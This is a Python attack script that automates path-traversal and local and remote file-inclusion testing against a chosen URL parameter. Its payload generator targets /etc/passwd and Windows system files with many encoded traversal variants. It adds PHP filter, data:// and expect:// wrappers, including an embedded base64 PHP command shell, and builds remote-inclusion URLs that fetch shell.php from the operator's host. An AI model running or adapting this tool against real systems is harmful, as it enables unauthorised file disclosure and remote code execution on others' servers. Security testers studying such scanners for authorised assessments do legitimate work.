import argparse
import requests
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

def get_args():
    parser = argparse.ArgumentParser()
    args_group = parser.add_argument_group("Generic", "Generic options")
    args_group.add_argument("--target", type=str, help="Specify the target's URL or IP address.", required=True)
    args_group.add_argument("--path", type=str, help="Specify the path within the target website.", required=True)
    args_group.add_argument("--param", type=str, help="Specify the name of the parameter to test.", required=True)
    args_group.add_argument("--depth", type=int, default=4, help="Set the maximum depth level to test.")
    args_group.add_argument("--fs", type=lambda s: list(map(int, s.split(','))), help="Filter responses by size. Provide one or more sizes separated by commas (e.g., 50,85).")
    args_group.add_argument("--threads", type=int, default=20, help="Specify the number of threads to use for concurrent requests.")
    args_group.add_argument("--timeout", type=int, default=5, help="Set the timeout duration (in seconds) for each request.")
    args_group.add_argument("--lhost", type=str, help="Specify our URL or IP address.")
    args_group.add_argument("--lport-http", type=str, help="Specify the port of our web server.")

    return parser.parse_args()


def generate_wordlist(args):
    result = []
    single_options = ["/", "\\"]
    path_traversal_options = ["../", "....//", r"....\/", r"%2e%2e%2f", r"%252e%252e%252f", r"..%c0%af", r"..%ef%bc%8f", "\\..", "..././"]
    targets_files = ["etc/passwd", "etc/apache2/apache2.conf", "\\windows\\win.ini", "windows/win.ini", "\\windows\\system32\\drivers\\etc\\hosts", "windows/system32/drivers/etc/hosts"]
    common_directories_filter = ["/var/www/images/", f"{args.param}/", f"{args.param}s/"]
    web_extensions = ["png", "jpg", "php", "html", "js", "aspx", "asp"]
    special_suffix = [r"%00"]

    special_suffixes = [s + '.' + ext for s in special_suffix for ext in web_extensions]

    for d in range(1, args.depth + 1):
        for target in targets_files:
            if d == 1:
                for s in single_options:
                    payloads = [s + target]

                    for p in payloads[:]:
                        for suffix in special_suffixes:
                            payloads.append(p + suffix)

                    for payload in payloads:
                        result.append(payload)
                        for prefix in common_directories_filter:
                            result.append(prefix + payload)

            for option in path_traversal_options: 
                traversal = option * d
                payloads = [traversal + target]

                for p in payloads[:]:
                    for suffix in special_suffixes:
                        payloads.append(p + suffix)

                for payload in payloads:
                    result.append(payload)
                    for prefix in common_directories_filter:
                        result.append(prefix + payload)

    result = add_php_wrappers(result)

    if args.lhost is not None:
        result = add_remote_file_inclusion(result, args)

    return result


def add_php_wrappers(wordlist: list):
    common_names_web_files = ["index", "index.html", "index.php", "config", "config.php"]
    php_wrappers = ["php://filter/read=convert.base64-encode/resource="]
    special_php_wrappers = ["data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=whoami", "expect://whoami"]

    wordlist.extend([f"{php_wrapper}{item}" for item in wordlist for php_wrapper in php_wrappers])

    for php_wrapper in php_wrappers:
        for name_web_file in common_names_web_files:
            wordlist.append(f"{php_wrapper}{name_web_file}")
    
    for special_php_wrapper in special_php_wrappers:
        wordlist.append(special_php_wrapper)

    return wordlist


def add_remote_file_inclusion(wordlist, args):    
    if args.lhost is not None:
        wordlist.append(f"http://{args.lhost}:{args.lport_http}/shell.php&cmd=whoami" if args.lport_http is not None else f"http://{args.lhost}/shell.php&cmd=whoami")
        wordlist.append(f"ftp://{args.lhost}/shell.php&cmd=whoami")
        wordlist.append(f"\\\\{args.lhost}\\share\\shell.php&cmd=whoami")
    
    return wordlist


def run_attack(args, wordlist):
    results = []
    print("[+] Executing...")

    base_url = args.target.rstrip('/') + '/' + args.path.lstrip('/')

    def process_payload(payload):
        params = {args.param: payload}
        query_string = urlencode(params, quote_via=lambda x, safe='', encoding=None, errors=None: x)
        full_url = f"{base_url}?{query_string}"

        try:
            response = requests.get(full_url, timeout=args.timeout)
            if args.fs is None or len(response.text) not in args.fs:
                return {
                    'url': response.url,
                    'status_code': response.status_code,
                    'payload': payload,
                    'content_length': len(response.text)
                }
        except requests.RequestException as e:
            return {
                'url': base_url,
                'payload': payload,
                'error': str(e)
            }

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_payload, payload): payload for payload in wordlist}

        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
                if 'error' not in result:
                    print(f"[+] Found: [Size: {result['content_length']}, Payload: {result['payload']}, URL: {result['url']}]")
                else:
                    print(f"[!] Error: [Payload: {result['payload']}, Error: {result['error']}]")

    print("\r[+] Execution completed.   ")

    return results


def main():
    args = get_args()

    wordlist = generate_wordlist(args)

    findings = run_attack(args, wordlist)


if __name__ == "__main__":
    main()